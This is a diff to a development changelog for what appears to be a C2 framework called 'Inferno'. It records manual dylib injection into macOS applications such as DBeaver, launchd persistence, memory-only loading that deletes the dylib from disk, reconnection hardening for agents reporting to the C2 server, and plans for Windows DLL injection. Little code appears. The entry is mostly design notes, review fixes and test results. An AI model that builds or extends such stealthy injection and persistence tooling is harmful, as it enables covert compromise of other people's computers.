@@ -566,6 +566,80 @@ given target, media capture on macOS is not possible without user prompting.
 | 3 | Agent dies when DBeaver is closed | `KeepAlive = false` in plist | Set `KeepAlive = true` so launchd auto-restarts DBeaver (and the injected agent) |
 | 4 | White row-number column in Injection Targets / Intelligence Analysis tables on macOS | Qt's native Cocoa `QHeaderView` ignores `::section` background unless the base widget background is also set | Added `QHeaderView { background: #0c0c0c; }` to `INTEL_TABLE` stylesheet in `StyleSheets.hpp` |
 
+### Phase 4A Completion — Manual Injection & Reconnection Hardening — [2026-06-22]
+
+**Objective**: Complete the macOS injection stack with manual injection from the GUI, reconnection resilience, cross-platform build fixes, and CodeRabbit address.
+
+#### Protocol Extensions
+- **`INJECT (0x010A)`** — Server→Agent: inject dylib into target app. Payload = target executable path.
+- **`INJECT_RES (0x010B)`** — Agent→Server: injection result. Payload = `path||capability|success(0/1)`.
+
+#### Server
+- `sendInjectCommand(ip, targetPath)` dispatches INJECT packet to agent by IP.
+- `processPacketBuffer` handles INJECT_RES, emits `injectResultReceived` signal.
+- New signal: `injectResultReceived(QString ip, bool success, QString targetPath)`.
+
+#### Agent
+- `handleInjection(Packet&&)` constructs `TargetApp` from path, calls `injectIntoTarget()`, sends INJECT_RES.
+- `getAgentDylibPath()` — extracted shared helper for dylib path (used by both `handleInjection` and `persistInjectedAgent`).
+- **Persistence guard**: `m_persistence_installed` flag prevents rewriting the plist on every `SYS_REQ_INFO`.
+
+#### GUI — Injection Targets Panel
+- Table expanded to 5 columns: Agent, Target App, Vector, Status, **Action**.
+- Per-row **Inject** button: green (`#004d00` bg, `#00ff41` border) for "Ready" targets, grey/disabled for "✅ Injected".
+- Button click emits `injectRequested(ip, targetPath)` → server → agent.
+- `onInjectResult` updates the status cell and swaps the button to disabled "Injected" state.
+- Full target path stored in `Qt::UserRole` for row identification.
+- Action column fixed at 110px, buttons at 95×34px with increased padding.
+- Row height set to 42px via `verticalHeader()->setDefaultSectionSize`.
+
+#### Reconnection Fix (`Socket.cpp`)
+- **`setReceiveTimeout(10s)`** — `recv()` returns after 10s if no data arrives, preventing the agent from blocking forever on a dead connection.
+- **`setKeepAlive(30s idle, 10s interval)`** — TCP keepalive probes detect half-open connections.
+- Both configured automatically in `Socket::connectTo()` after a successful connection.
+
+#### Multi-Target Reporting
+- Agent now sends **all** scanner targets (newline-delimited) instead of only `targets[0]`.
+- Server parses multi-line report and creates one table row per target.
+- Current host process detected via `_NSGetExecutablePath()` and marked as "✅ Injected".
+
+#### Cross-Platform Build Fixes
+- `MachInjector.cpp`: restructured with three compile paths — `INFERNO_TESTING` stub (returns true), `__APPLE__` real implementation (fork+execv), generic stub (returns false).
+- Added `<cstdint>` include to `MachInjector.hpp` for `uint16_t`.
+- Moved `MachInjector.cpp` and `EntitlementScanner.cpp` to general source lists (not just `if(APPLE)`).
+- `_CRT_SECURE_NO_WARNINGS` added for MSVC `getenv` deprecation.
+- `(void)idle_sec; (void)interval_sec;` guarded by `_WIN32` in `setKeepAlive`.
+- Windows CI Qt version bumped from 6.6.0 to 6.7.3 (broken qtdeclarative archive).
+- `scanner_test.cpp`: moved `#include "EntitlementScanner.hpp"` outside `__APPLE__` guard.
+
+#### CodeRabbit Address
+| # | Issue | Fix |
+|---|---|---|
+| 1 | Plist rewritten on every SYS_REQ_INFO | `m_persistence_installed` flag |
+| 2 | Dylib path duplicated in 2 functions | Extracted `getAgentDylibPath()` |
+| 3 | verify_phase4a.sh grep patterns wrong | Updated to match actual wrapper output |
+| 4 | XML special chars in plist values | Added `escapeXml()` helper |
+| 5 | readEntitlements comment says WNOHANG but code uses 0 | Fixed comment |
+| 6 | Plist parsed line-by-line (fails on multi-line) | Read entire file into string |
+| 7 | `(IOError, OSError)` redundant in Python 3 | Simplified to `OSError` |
+| 8 | `fprintf` runtime string as format arg | Added `"%s"` format specifier |
+| 9 | Shim dlopen race condition (500ms too tight) | Increased to 1s/2s delays |
+| 10 | Duplicate decryption + wrong comment label | Copy temp dylib instead of re-decrypting; fixed "Step 2b" → "Step 2c" |
+
+#### Tests
+- `test_inject_packet_roundtrip` — INJECT opcode serialization/deserialization.
+- `test_inject_res_packet_roundtrip` — INJECT_RES opcode round-trip.
+- `test_inject_e2e` — full server↔client INJECT/INJECT_RES round-trip without forking.
+- All **34 tests passing** across macOS, Linux, and Windows.
+
+#### Verification
+- `verify_phase4a.sh` manual verification passes:
+  - Stage 1: All unit tests pass.
+  - Stage 2: Shim + dylib loads correctly, agent starts in-process.
+  - Stage 3: Wrapper injects into DBeaver (Tier 2), launches Tier 1 shim, both agents connect to C2.
+  - No standalone `inferno_client` process (memory-only injection confirmed).
+  - Dylib deleted from disk after loading.
+
 ### Next Steps
 - **Phase 4B**: Windows DLL injection — `CreateRemoteThread` + LoadLibrary,
   reflective DLL loader.
